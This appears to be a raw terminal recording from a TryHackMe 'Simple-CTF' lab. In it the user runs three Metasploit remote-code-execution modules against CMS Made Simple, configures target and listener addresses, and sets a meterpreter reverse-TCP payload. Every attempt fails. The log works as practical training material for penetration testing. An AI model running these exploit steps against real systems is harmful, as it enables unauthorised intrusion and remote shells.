@@ -1,0 +1,454 @@
+Script started on 2020-11-20 09:19:53-03:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="39"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# msfconsole
+[?2004l[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../                                                  
+[0m[36m# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+[0m
+
+       =[ [33mmetasploit v6.0.16-dev[0m                          ]
++ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: To save all commands executed since start up to a file, use the [32mmakerc[0m command
+
+[?1034h[4mmsf6[0m [0m> search cmsms
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/multi/http/[45mcmsms[0m_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+   1  exploit/multi/http/[45mcmsms[0m_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple ([45mCMSMS[0m) Showtime2 File Upload RCE
+   2  exploit/multi/http/[45mcmsms[0m_upload_rename_rce     2018-07-03       [32mexcellent[0m  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+
+
+Interact with a module by name or index. For example [32minfo 2[0m, [32muse 2[0m or [32muse exploit/multi/http/cmsms_upload_rename_rce[0m
+
+[4mmsf6[0m [0m> use exploit/multi/http/cmsms_object_injection_rce
+[0m[1m[34m[*][0m No payload configured, defaulting to php/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> set rhosts 10.10.168.186
+[0mrhosts => 10.10.168.186
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> ifconfig tuno[K0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::e38b:dabe:c673:2a79  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 663  bytes 358931 (350.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 732  bytes 237019 (231.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> setl[K lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable. Set ForceExploit to override.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> exploit[Kshow options
+[0m
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.168.186    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> set ssl true
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+ssl => true
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=error: wrong version number
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> sho [Kw options
+[0m
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.168.186    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> set ssl false
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+ssl => false
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.168.186    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable. Set ForceExploit to override.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_object_injection_rce[0m) [0m> back
+[0m[4mmsf6[0m [0m> 
+[0m[4mmsf6[0m [0m> se[K[Kbackexploitshow options[C[C[C[C[C[C[C[Cet ssl false[C[C[C[C[C[C[C[C[Phow options[C[C[C[C[C[C[C[P[P[P[P[Pexploitset ssl true[C[C[C[C[C[C[C[Chow options[C[C[C[C[C[C[C[P[P[P[P[Pexploitset lhost 10.9.185.104[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[Pifconfig tun0[C[C[C[C[C[C[Cset rhosts 10.10.168.186[C[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[P[Phow options[C[C[C[C[C[C[Cuse exploit/multi/http/cmsms_object_injection_rce[C[C[C[C[C[C[Csearch cmsms[K[C[C[C[C[C[C[C[P[P[P[P[P[P[P[Pexit[Prunexitsearch cmsms[C[C[C[C[C[C[Cuse exploit/multi/http/cmsms_object_injection_rce[C[C[C[C[C[C[Cshow options[K[C[C[C[C[C[C[C[Cet rhosts 10.10.168.186[C[C[C[C[C[C[C[P[P[P[P[P[P[P[P[P[P[Pifconfig tun0[C[C[C[C[C[C[Cset lhost 10.9.185.104[C[C[C[C[C[C[Cexploit[Kshow options[C[C[C[C[C[C[C[Cet ssl true[C[C[C[C[C[C[C[P[P[P[P[Pexploitshow options[C[C[C[C[C[C[C[Cet ssl false[C[C[C[C[C[C[C[C[Phow options[C[C[C[C[C[C[C[P[P[P[P[Pexploit[P[P[Pback[Ksearch cmsms
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/multi/http/[45mcmsms[0m_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+   1  exploit/multi/http/[45mcmsms[0m_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple ([45mCMSMS[0m) Showtime2 File Upload RCE
+   2  exploit/multi/http/[45mcmsms[0m_upload_rename_rce     2018-07-03       [32mexcellent[0m  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+
+
+Interact with a module by name or index. For example [32minfo 2[0m, [32muse 2[0m or [32muse exploit/multi/http/cmsms_upload_rename_rce[0m
+
+[4mmsf6[0m [0m> use exploit/multi/http/cmsms_showtime2_rce
+[0m[1m[34m[*][0m No payload configured, defaulting to php/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> show ioti[K[K[K[Koptioins
+[0m[1m[31m[-][0m Invalid parameter "optioins", use "show -h" for more information
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/cmsms_showtime2_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    no        Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base CMS Made Simple directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> set rhots 10.10.168.186
+[0mrhots => 10.10.168.186
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> ifconfig tun0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::e38b:dabe:c673:2a79  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 1152  bytes 824720 (805.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1244  bytes 304571 (297.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/cmsms_showtime2_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    no        Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base CMS Made Simple directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> set rhots 10.10.168.186
+[0mrhots => 10.10.168.186
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> exploit
+[0m
+[1m[31m[-][0m Exploit failed: One or more options failed to validate: RHOSTS.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> set rhosts 10.10.168.186
+[0mrhosts => 10.10.168.186
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> show options
+[0m
+Module options (exploit/multi/http/cmsms_showtime2_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    no        Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.168.186    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base CMS Made Simple directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_showtime2_rce[0m) [0m> back
+[0m[4mmsf6[0m [0m> 
+[0m
+[4mmsf6[0m [0m> 
+[0m[4mmsf6[0m [0m> search m[Kcmsms
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank       Check  Description
+   -  ----                                           ---------------  ----       -----  -----------
+   0  exploit/multi/http/[45mcmsms[0m_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
+   1  exploit/multi/http/[45mcmsms[0m_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple ([45mCMSMS[0m) Showtime2 File Upload RCE
+   2  exploit/multi/http/[45mcmsms[0m_upload_rename_rce     2018-07-03       [32mexcellent[0m  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
+
+
+Interact with a module by name or index. For example [32minfo 2[0m, [32muse 2[0m or [32muse exploit/multi/http/cmsms_upload_rename_rce[0m
+
+[4mmsf6[0m [0m> use exploit/multi/http/cmsms_upload_rename_rce
+[0m[1m[34m[*][0m No payload configured, defaulting to php/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> s[Kshow options
+[0m
+Module options (exploit/multi/http/cmsms_upload_rename_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cmsms/          yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Universal
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> set rhots exploit/multi/http/cmsms_upload_rename_rce[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kosts 10.10.168.186
+[0mrhosts => 10.10.168.186
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> ifconfu[Kig tun0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::e38b:dabe:c673:2a79  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 1160  bytes 826092 (806.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1260  bytes 306277 (299.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> sho [Kw options
+[0m
+Module options (exploit/multi/http/cmsms_upload_rename_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.168.186    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cmsms/          yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Universal
+
+
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable. Set ForceExploit to override.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf6[0m exploit([1m[31mmulti/http/cmsms_upload_rename_rce[0m) [0m> 
